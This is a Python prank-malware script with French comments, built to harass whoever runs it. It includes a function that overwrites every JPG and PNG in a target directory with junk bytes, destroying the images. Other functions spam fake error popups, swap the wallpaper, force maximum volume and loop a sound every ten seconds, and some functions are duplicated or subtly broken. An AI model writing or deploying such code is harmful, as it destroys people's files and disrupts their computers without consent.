import os
import webbrowser
import ctypes
import subprocess
import msvcrt
import time

def infect_meme_app():
    meme_app_directory = "/path/to/meme/app"
    meme_files = os.listdir(meme_app_directory)

    for meme_file in meme_files:
        if meme_file.endswith(".jpg") or meme_file.endswith(".png"):
            meme_path = os.path.join(meme_app_directory, meme_file)
            replace_with_bizarre_meme(meme_path)

def replace_with_bizarre_meme(meme_path):
    with open(meme_path, 'wb') as meme_file:
        meme_file.write(b'Your bizarre content here')

def play_josh():
    josh = "https://www.youtube.com/watch?v=BbeeuzU5Qc8"
    webbrowser.open(josh)

# Fonctionnes sur Linux
def display_fake_error():
    i = 0
    while i < 15:
        os.system("notify-send 'ERROR' 'Can you hear my whistle baby'")
        i += 1

# Fonctionne sur Windows
def display_fake_error():
    i = 0
    while i < 15:
        ctypes.windll.user32.MessageBoxW(0, "Can you hear my whistle baby", "W Rizz", 1)
        i += 1

# Fonctionne sur Linux
def change_wallpaper():
    clown_wallpaper_path = "/path/to/clown_wallpaper.jpg"
    os.system(f"gsettings set org.gnome.desktop.background picture-uri file://{clown_wallpaper_path}")

# Fonctionne sur Windows
def change_wallpaper():
    clown_wallpaper_path = r"E:\h\path\to\clown_wallpaper.jpg"
    ctypes.windll.user32.SystemParametersInfoW(20, 0, clown_wallpaper_path, 3)


nircmd_path = r"E:\h\nircmd.exe"

def set_max_volume():
    try:
        # Windows-specific volume control using ctypes
        ctypes.windll.kernel32.Wow64DisableWow64FsRedirection(ctypes.byref(ctypes.c_long(1)))
        subprocess.call([nircmd_path, "changesysvolume", "65535"])
    except Exception as e:
        print(f"Error setting max volume: {e}")
        
def is_del_key_pressed():
    return msvcrt.kbhit() and msvcrt.getch() == b'\x7f'  # b'\x7f' represents the DEL key

mp3_path = r"E:\h\path\to\sound\pouet.mp3"

def play_periodic_sound():
    try:
        subprocess.call(["start", "wmplayer", "/play", "/close", mp3_path])
    except Exception as e:
        print(f"Error playing sound: {e}")

#while True:
#    set_max_volume()
#    if is_del_key_pressed():
#        break
#    
while True:
    play_periodic_sound()
    time.sleep(10)
    if is_del_key_pressed():
        break

    
# Execute the functions
#infect_meme_app()
#play_josh()
#display_fake_error()
#change_wallpaper()
